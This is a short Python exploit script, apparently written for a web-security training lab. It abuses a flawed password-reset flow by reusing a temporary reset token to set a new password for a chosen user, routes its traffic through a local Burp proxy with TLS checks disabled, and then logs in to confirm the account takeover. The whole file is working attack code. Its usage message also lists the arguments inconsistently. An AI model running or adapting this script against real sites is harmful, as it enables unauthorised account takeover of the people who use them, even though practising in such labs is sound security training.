# Go through PW reset process with known user then feed info to script
import sys
import requests
import urllib3


# Suppress the insecure requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Add proxy for troubleshoot, for urllib3 all proxies should use http
# Uses the Burp proxy -> Make sure Burp is running
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

def logic_bypass(url, temp_token,username, new_password):
    data = {
        "temp-forgot-password-token":temp_token,
        "username": username,
        "new-password-1": new_password,
        "new-password-2": new_password
    }   
    s = requests.Session()
    r = s.get(url+'forgot-password?temp-forgot-password-token='+temp_token, verify=False, proxies=proxies)
    r2 = s.post(url+'forgot-password?temp-forgot-password-token='+temp_token, data=data, verify=False, proxies=proxies)
    
    if r2.status_code == 200:
        print(f'***** Password reset bypass successful *****')
        print(f'*** {new_password} set for {username} *****')
        print("Testing login")
        s2 = requests.Session()
        data2 = {
            'username':username,
            'password':new_password
        }
        r3 = s2.get(url+'login',verify=False, proxies=proxies)
        r4 = s2.post(url+'login', data=data2, verify=False, proxies=proxies)
        if "Your email is" in r4.text:
            print(f'***{new_password} verified for {username}')

    


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        temp_token = sys.argv[2].strip()
        username = sys.argv[3].strip()
        new_password = sys.argv[4].strip()
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url> username new_password')
        print(f'[-] Example: {sys.argv[0]} www.example.com carlos password')
        sys.exit(-1)
    
    
    print('[-] Performing password reset logic bypass')
    logic_bypass(url, temp_token, username, new_password)




